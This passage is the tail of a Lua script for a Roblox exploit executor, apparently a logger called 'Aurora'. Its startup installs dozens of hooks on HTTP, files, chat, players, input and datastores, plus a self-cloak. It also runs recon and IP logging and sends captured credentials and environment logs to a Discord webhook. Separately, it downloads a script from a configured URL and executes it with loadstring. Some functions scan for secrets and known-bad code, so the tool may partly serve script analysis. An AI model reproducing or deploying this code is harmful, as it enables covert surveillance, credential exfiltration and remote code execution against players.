    env[name]=newcclosure(function(...)
        if in_reentry() then return orig(...) end
        entering(); local s,l,n,fr=caller_info(2); leaving()
        log_event("invoke",{target=name,args=table.pack(...),src=s,line=l,fn=n,frames=fr})
        return orig(...)
    end)
end

function Logger.mark(kind,payload) log_event(kind,payload) end
function Logger.snapshot(env,label) return {label=label or "env",keys=snapshot_env(env),t=mono()} end
function Logger.watch(tbl,label) return make_watch_proxy(tbl,label) end
function Logger.taint(v,tag) local t=typeof(v); if t=="table" or t=="function" or t=="userdata" then taint[v]=tag or true end end
function Logger.is_tainted(v)
    local t=typeof(v)
    if t=="string" then return is_tainted_string(v) end
    if t=="table" or t=="function" or t=="userdata" then return taint[v] or false end
    return false
end
function Logger.scan(v,ctx) ctx=ctx or {kind="manual",src="Logger.scan",line=0,fn="scan"}; scan_value(v,ctx,0) end
function Logger.scan_decoded(v,ctx) ctx=ctx or {kind="manual_decoded",src="Logger.scan_decoded",line=0,fn="scan_decoded"}; scan_decoded(v,ctx) end
function Logger.flush() flush_creds_queue(); flush_envlog_queue(true); persist_replay() end
function Logger.stop()
    _running=false
    pcall(send_beacon,"manual_stop")
    pcall(save_last_session)
    Logger.flush()
    if creds_handle then pcall(function() creds_handle:close() end); creds_handle=nil end
    if envlog_handle then pcall(function() envlog_handle:close() end); envlog_handle=nil end
    if jsonl_handle then pcall(function() jsonl_handle:close() end); jsonl_handle=nil end
end
function Logger.set_filter(name,patterns) if filters[name]==nil then return end; filters[name]=patterns or {} end
function Logger.add_signature(sig) if type(sig)=="table" and type(sig.match)=="function" then signatures[#signatures+1]=sig end end
function Logger.add_pattern(name,re,sev) if type(name)~="string" or type(re)~="string" then return end; PATTERNS[#PATTERNS+1]={name=name,re=re,sev=sev or "MED"} end
function Logger.set_level(l) if level_rank[l] then CONFIG.level=l; return true end; return false end
function Logger.enable_module(name,on) if CONFIG[name]==nil then return false end; CONFIG[name]=on and true or false; return true end
function Logger.dump_function(fn)
    if type(fn)~="function" then return nil end
    local info={source=debug.info(fn,"s"),line=debug.info(fn,"l"),name=debug.info(fn,"n")}
    info.upvalues={}
    if debug.getupvalues then local ok,ups=pcall(debug.getupvalues,fn); if ok and ups then for i,v in ipairs(ups) do info.upvalues[i]={index=i,type=typeof(v),value=fmt_val(v,1)} end end end
    if debug.getupvalue then local i=1; while true do local name,val=debug.getupvalue(fn,i); if not name then break end; info.upvalues[i]={name=name,index=i,type=typeof(val),value=fmt_val(val,1)}; i=i+1 end end
    info.constants={}
    if debug.getconstants then local ok,cs=pcall(debug.getconstants,fn); if ok and cs then for i,c in ipairs(cs) do info.constants[i]={index=i,type=typeof(c),value=fmt_val(c,1)} end end end
    info.protos={}
    if debug.getprotos then local ok,ps=pcall(debug.getprotos,fn); if ok and ps then for i,p in ipairs(ps) do info.protos[i]={index=i,source=debug.info(p,"s"),line=debug.info(p,"l")} end end end
    return info
end
function Logger.dump_closure(fn)
    if type(fn)~="function" then return nil end
    if dump_function then local ok,dumped=pcall(dump_function,fn); if ok and dumped then return dumped end end
    return Logger.dump_function(fn)
end
function Logger.dump_scripts(filter)
    local out={}; if not getscripts then return out end
    for _,scr in ipairs(getscripts()) do local name=scr.Name; if not filter or name:find(filter,1,true) then out[#out+1]={name=name,class=scr.ClassName,path=scr:GetFullName()} end end
    return out
end
function Logger.decompile(scr) if decompile then return decompile(scr) end; if getscriptbytecode then return getscriptbytecode(scr) end; return nil end
function Logger.scan_gc()
    if not getgc then return {} end
    local counts={["function"]=0,table=0,userdata=0,thread=0,["?"]=0}
    local ok,gc=pcall(getgc); if not ok or not gc then return counts end
    for _,obj in ipairs(gc) do local t=typeof(obj); counts[t]=(counts[t] or 0)+1 end
    return counts
end
function Logger.remote_inventory()
    local out={}; local RS=game:GetService("ReplicatedStorage")
    for _,inst in ipairs(RS:GetDescendants()) do
        local c=inst.ClassName
        if c=="RemoteEvent" or c=="RemoteFunction" or c=="UnreliableRemoteEvent" or c=="BindableEvent" or c=="BindableFunction" then out[#out+1]={class=c,name=inst.Name,path=inst:GetFullName()} end
    end
    return out
end
function Logger.watch_instance(inst,props)
    if not inst or typeof(inst)~="Instance" then return nil end
    props=props or {}
    local label=inst:GetFullName()
    inst.ChildAdded:Connect(function(c) Logger.mark("inst_watch",{target=label,op="child_added",class=c.ClassName,name=c.Name}) end)
    inst.ChildRemoved:Connect(function(c) Logger.mark("inst_watch",{target=label,op="child_removed",class=c.ClassName,name=c.Name}) end)
    for _,prop in ipairs(props) do local ok,sig=pcall(function() return inst:GetPropertyChangedSignal(prop) end); if ok and sig then sig:Connect(function() Logger.mark("inst_watch",{target=label,op="prop",prop=prop,value=tostring(inst[prop])}) end) end end
    return true
end
function Logger.watch_all_props(inst)
    if not inst or typeof(inst)~="Instance" then return nil end
    local label=inst:GetFullName()
    inst.Changed:Connect(function(prop) Logger.mark("inst_watch",{target=label,op="changed",prop=tostring(prop),value=tostring(inst[prop])}) end)
    return true
end
function Logger.send_now(title,fields,desc,color) return send_embed(title,fields,desc,color) end
function Logger.send_creds_now(b) return send_creds_file(b) end
function Logger.send_envlog_now(b) return send_envlog_file(b) end
function Logger.beacon(reason) return send_beacon(reason or "manual") end
function Logger.capabilities() return CAP,CAP_REASON end
function Logger.graph() return graph end
function Logger.views() return Views end
function Logger.secret_hits() return SECRETS.hits end
function Logger.secret_reset() SECRETS.seen={}; SECRETS.hits=0 end
function Logger.set_webhook(url) _G.AuroraCFG = _G.AuroraCFG or {}; _G.AuroraCFG.WebhookURL=url; refresh_webhook() end
function Logger.set_footer(text) CUSTOM_FOOTER=text end
function Logger.set_redact(style,keep) CONFIG.redact_style=style or CONFIG.redact_style; CONFIG.redact_keep_last=keep or CONFIG.redact_keep_last end
function Logger.recon() send_recon() end
function Logger.heartbeat() send_heartbeat() end
function Logger.session_id() return SESSION_ID end
function Logger.enable_decoy(on) CONFIG.decoy_injection=on and true or false end
function Logger.replay_snapshot() return replay end
function Logger.lineage() return cred_lineage end
function Logger.schemas() return remote_schemas end
function Logger.fingerprints() return http_fingerprints end
function Logger.query() return Query end
function Logger.session() return Session end
function Logger.summary() return summary() end
function Logger.dashboard() return Dashboard end
function Logger.diagnostics() return Diag end
function Logger.tests() return Tests end
function Logger.reconstruct() return Reconstruct end
function Logger.coverage() return coverage end
function Logger.schemas_learned() return schemas end
function Logger.function_lifecycle() return func_life end
function Logger.return_log() return return_log end
function Logger.upvalue_graph() return upvalue_graph end
function Logger.metatable_graph() return mt_graph end
function Logger.bus() return bus end
function Logger.exec_fingerprint() return exec_fp end
function Logger.webhook() return DISCORD_WEBHOOK end
function Logger.script_scores()
    local list={}
    for k,v in pairs(script_scores) do list[#list+1]={script=k,score=v} end
    table.sort(list,function(a,b) return a.score>b.score end)
    return list
end
function Logger.file_hashes() return file_hashes end
function Logger.remote_timing_data() return remote_timing end
function Logger.obfuscation_score(src) return obfuscation_score and obfuscation_score(src) or 0 end
function Logger.domain_rate() return domain_rate end
function Logger.partial_tokens() return partial_tokens end
function Logger.exfil_chains() return exfil_chain_window end

Logger.CONFIG=CONFIG
Logger.filters=filters
Logger.signatures=signatures
Logger.patterns=PATTERNS
Logger.views_table=Views
Logger.EMBED_COLOR=EMBED_COLOR
Logger.ALERT_COLOR=ALERT_COLOR
Logger.SCHEMA_VERSION=SCHEMA_VERSION
Logger.SESSION_ID=SESSION_ID

probe()
capture_executor_fingerprint()
pcall(install_metahooks)
pcall(install_global_hooks)
pcall(install_coroutine_hooks)
pcall(install_task_hooks)
pcall(install_http_hooks)
pcall(install_file_hooks)
pcall(install_debug_hooks)
pcall(install_closure_hooks)
pcall(install_player_hooks)
pcall(install_chat_hooks)
pcall(install_character_hooks)
pcall(install_descendant_gui_spy)
pcall(install_drawing_spy)
pcall(install_uis_input)
pcall(install_cas_spy)
pcall(install_datastore_spy)
pcall(install_marketplace_spy)
pcall(install_teleport_spy)
pcall(install_sound_spy)
pcall(install_animation_spy)
pcall(install_camera_spy)
pcall(install_lighting_spy)
pcall(install_error_capture)
pcall(install_network_stats)
pcall(install_fps_counter)
pcall(install_env_snapshot)
pcall(install_known_bad_scan)
pcall(install_hook_sweep)
pcall(install_heap_sampler)
pcall(install_sig_of_day)
pcall(install_memory_watch)
pcall(install_suspend_guard)
pcall(install_c_api_tracer)
pcall(install_remote_recv)
pcall(install_raycast_spy)
pcall(install_physics_spy)
pcall(install_coregui_spy)
pcall(install_adornment_spy)
pcall(install_tween_spy)
pcall(install_attr_change_spy)
pcall(install_appearance_spy)
pcall(install_mouse_behavior_spy)
pcall(install_text_channel_spy)
pcall(install_camera_write_spy)
pcall(install_collision_spy)
pcall(install_noclip_spy)
pcall(install_state_abuse_spy)
pcall(install_player_field_spy)
pcall(install_chat_flood_monitor)
pcall(install_honeypot)
pcall(install_print_capture)
pcall(install_mutation_detector)
pcall(install_teleport_detect)
pcall(install_input_inject_spy)
pcall(install_self_cloak)

task.spawn(function() task.wait(1); pcall(send_recon); pcall(run_ip_log) end)
task.spawn(function() task.wait(2); pcall(snapshot_aurora_upvalues) end)

task.spawn(function()
    task.wait(0.2)
    local target_url=(_G.AuroraCFG and _G.AuroraCFG.TargetScript) or ""
    if target_url=="" then return end
    local ok,source=pcall(function() return game:HttpGet(target_url) end)
    if not ok or type(source)~="string" or source=="" then
        log_event("target_script",{op="fetch_failed",url=target_url,error=tostring(source),src="loader",line=0,fn="fetch"})
        return
    end
    scan_string(source,{kind="target_script_source",src="loader",line=0,fn="scan"})
    log_event("target_script",{op="fetched",url=target_url,size=#source,hash=simple_hash(source),src="loader",line=0,fn="fetch"})
    local fn,err=loadstring(source)
    if not fn then
        log_event("target_script",{op="parse_error",url=target_url,error=tostring(err),src="loader",line=0,fn="parse"})
        return
    end
    local run_ok,run_err=pcall(fn)
    if not run_ok then
        log_event("target_script",{op="runtime_error",url=target_url,error=tostring(run_err),src="loader",line=0,fn="run"})
    else
        log_event("target_script",{op="completed",url=target_url,src="loader",line=0,fn="run"})
    end
end)
task.spawn(function()
    task.wait(0.5)
    pcall(load_session_diff)
    local env=getgenv and getgenv() or _G
    for _,n in ipairs({"hookfunction","newcclosure","getrawmetatable"}) do
        if env[n] then _capability_saved[n]=env[n] end
    end
end)

local function flush() flush_creds_queue(); flush_envlog_queue() end

task.spawn(function()
    local last_flush=mono(); local last_diff=mono(); local last_hb=mono()
    local last_ig=mono(); local last_replay=mono(); local last_jsave=mono()
    while _running do
        task.wait(0.1)
        if mono()-last_flush>=CONFIG.flush_interval then last_flush=mono(); pcall(flush) end
        if CONFIG.env_diff_enabled and mono()-last_diff>=CONFIG.env_diff_interval then last_diff=mono(); pcall(diff_env) end
        if CONFIG.heartbeat_seconds>0 and mono()-last_hb>=CONFIG.heartbeat_seconds then last_hb=mono(); pcall(send_heartbeat) end
        if CONFIG.integrity_seconds>0 and mono()-last_ig>=CONFIG.integrity_seconds then last_ig=mono(); pcall(check_integrity) end
        if mono()-last_replay>=30 then last_replay=mono(); pcall(persist_replay) end
        if CONFIG.autosave_jsonl_interval>0 and mono()-last_jsave>=CONFIG.autosave_jsonl_interval then last_jsave=mono(); if jsonl_handle then pcall(function() jsonl_handle:flush() end) end end
        if math.random()<0.05 then
            local now=mono()
            for k,b in pairs(rate_buckets) do if now-(b.start or 0)>10 then rate_buckets[k]=nil end end
        end
    end
end)

return Logger
